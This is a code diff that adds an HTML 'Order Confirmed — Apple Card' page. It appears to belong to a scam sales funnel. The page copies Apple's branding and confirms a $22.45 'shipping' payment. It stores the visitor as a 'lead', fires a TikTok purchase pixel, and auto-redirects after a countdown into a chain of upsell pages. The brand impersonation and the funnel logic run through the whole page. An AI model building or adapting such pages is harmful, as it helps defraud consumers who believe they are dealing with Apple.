@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Order Confirmed — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-black:#1D1D1F;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--success:#34C759;--surface:#FFFFFF}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .page{max-width:520px;width:100%;margin:0 auto;min-height:100vh;background:var(--surface);display:flex;flex-direction:column}
+
+        .nav{display:flex;align-items:center;justify-content:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200)}
+        .nav-title{font-size:0.9375rem;font-weight:600}
+
+        .content{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;text-align:center}
+
+        .success-circle{width:80px;height:80px;border-radius:50%;background:rgba(52,199,89,0.1);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;animation:scaleIn 0.5s cubic-bezier(0.32,0.72,0,1)}
+        .success-circle svg{width:40px;height:40px;fill:var(--success);animation:checkmark 0.4s ease 0.3s both}
+
+        .success-title{font-size:1.5rem;font-weight:800;letter-spacing:-0.02em;margin-bottom:8px;animation:fadeUp 0.5s ease 0.2s both}
+        .success-subtitle{font-size:0.9375rem;color:var(--gray-500);line-height:1.5;margin-bottom:32px;animation:fadeUp 0.5s ease 0.3s both}
+
+        .order-info{width:100%;background:var(--gray-100);border-radius:14px;padding:20px;margin-bottom:24px;animation:fadeUp 0.5s ease 0.4s both}
+        .oi-row{display:flex;justify-content:space-between;padding:6px 0;font-size:0.8125rem}
+        .oi-row .oi-label{color:var(--gray-500)}
+        .oi-row .oi-value{font-weight:600}
+        .oi-divider{height:1px;background:var(--gray-200);margin:8px 0}
+
+        .apple-logo{width:28px;height:34px;margin:0 auto 16px;opacity:0.15}
+
+        .note{font-size:0.75rem;color:var(--gray-400);line-height:1.5;max-width:320px;margin:0 auto;animation:fadeUp 0.5s ease 0.5s both}
+
+        .continue-btn{display:block;width:100%;max-width:320px;margin:0 auto 12px;padding:16px;border:none;border-radius:14px;font-size:1rem;font-weight:700;cursor:pointer;font-family:inherit;background:var(--apple-black);color:#fff;animation:fadeUp 0.5s ease 0.5s both;transition:opacity 0.2s}
+        .continue-btn:hover{opacity:0.92}
+        .continue-btn:active{transform:scale(0.98)}
+        .countdown-line{font-size:0.6875rem;color:var(--gray-400);text-align:center;margin-bottom:16px}
+        .countdown-line strong{color:var(--gray-500)}
+
+        @keyframes scaleIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+        @keyframes checkmark{from{opacity:0;transform:scale(0.5)}to{opacity:1;transform:scale(1)}}
+        @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="nav">
+            <div class="nav-title">Order Confirmed</div>
+        </div>
+
+        <div class="content">
+            <div class="success-circle">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            </div>
+
+            <h1 class="success-title">Payment confirmed!</h1>
+            <p class="success-subtitle">
+                Your Apple Card is being prepared with care.<br>
+                You'll receive status updates by email and SMS.
+            </p>
+
+            <div class="order-info">
+                <div class="oi-row">
+                    <span class="oi-label">Product</span>
+                    <span class="oi-value">Apple Card <span id="cardColor">Titanium</span></span>
+                </div>
+                <div class="oi-row">
+                    <span class="oi-label">Shipping</span>
+                    <span class="oi-value" id="shippingType">Express</span>
+                </div>
+                <div class="oi-divider"></div>
+                <div class="oi-row">
+                    <span class="oi-label">Payment</span>
+                    <span class="oi-value" id="paymentMethodLabel" style="color:var(--success)">Card ✓</span>
+                </div>
+                <div class="oi-row">
+                    <span class="oi-label">Total paid</span>
+                    <span class="oi-value" id="totalPaid">$22.45</span>
+                </div>
+                <div class="oi-divider"></div>
+                <div class="oi-row">
+                    <span class="oi-label">Order ID</span>
+                    <span class="oi-value" id="orderId" style="font-size:0.6875rem;font-family:monospace">—</span>
+                </div>
+            </div>
+
+            <button class="continue-btn" id="continueBtn">Continue</button>
+            <div class="countdown-line">Auto-continuing in <strong id="countdownNum">8</strong>s</div>
+
+            <img class="apple-logo" src="assets/images/logo3d.svg" alt="">
+
+            <p class="note">
+                You'll receive a receipt by email.
+                Save your Order ID for future reference.
+            </p>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        const LeadData = {
+            _key: 'applecard_lead',
+            load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}') } catch { return {} } },
+            update(d) { const c = this.load(); const u = {...c, ...d, updated_at: Date.now()}; localStorage.setItem(this._key, JSON.stringify(u)); return u; }
+        };
+
+        const data = LeadData.load();
+        const params = new URLSearchParams(window.location.search);
+        const tipoLabels = { economico:'Standard', expresso:'Express', premium:'Premium' };
+
+        const frete = data.frete_valor || parseFloat(params.get('frete')) || 22.45;
+        const tipo = data.frete_tipo || params.get('tipo') || 'expresso';
+        const corLabel = data.cartao_cor_label || 'Titanium';
+        const txId = data.transaction_id || '—';
+
+        document.getElementById('cardColor').textContent = corLabel;
+        document.getElementById('shippingType').textContent = tipoLabels[tipo] || 'Express';
+        document.getElementById('totalPaid').textContent = `$${frete.toFixed(2)}`;
+        document.getElementById('orderId').textContent = txId;
+
+        // With Cooud, payment method is determined on the hosted page (card / PIX / etc.).
+        // We only know "paid"; label generically unless server told us a specific method.
+        const payMethod = (data.payment_method || 'cooud').toString();
+        const methodLabel = payMethod === 'multibanco' ? 'Bank transfer ✓' :
+                            payMethod === 'mbway'      ? 'Card ✓' :
+                                                         'Card ✓';
+        document.getElementById('paymentMethodLabel').textContent = methodLabel;
+
+        LeadData.update({ page: 'obrigado', funnel_complete: true });
+
+        // Purchase backup — uses the same event_id as checkout/server to dedupe.
+        try {
+            if (window.ttq && txId && txId !== '—') {
+                window.ttq.track('Purchase', {
+                    value: frete,
+                    currency: 'USD',
+                    content_type: 'product',
+                    content_id: 'apple-card-us-' + tipo,
+                    content_name: 'Apple Card — ' + (tipoLabels[tipo] || 'Express'),
+                    transaction_id: txId,
+                    event_id: 'purchase_' + txId
+                }, { event_id: 'purchase_' + txId });
+            }
+            if (window.identifyUser) window.identifyUser();
+        } catch (e) {}
+
+        // ─── Upsell chain: visible countdown + manual button ───
+        function goNext() {
+            var u = new URL('upsells/upp0-fatura/index.html', window.location.href);
+            new URLSearchParams(window.location.search).forEach(function (v, k) {
+                if (k !== 'pay' && k !== 'cooud_session_id') u.searchParams.set(k, v);
+            });
+            window.location.href = u.toString();
+        }
+        document.getElementById('continueBtn').addEventListener('click', goNext);
+
+        var seconds = 8;
+        var cdEl = document.getElementById('countdownNum');
+        var cdInterval = setInterval(function () {
+            seconds--;
+            if (cdEl) cdEl.textContent = seconds;
+            if (seconds <= 0) { clearInterval(cdInterval); goNext(); }
+        }, 1000);
+    })();
+    </script>
+</body>
+</html>
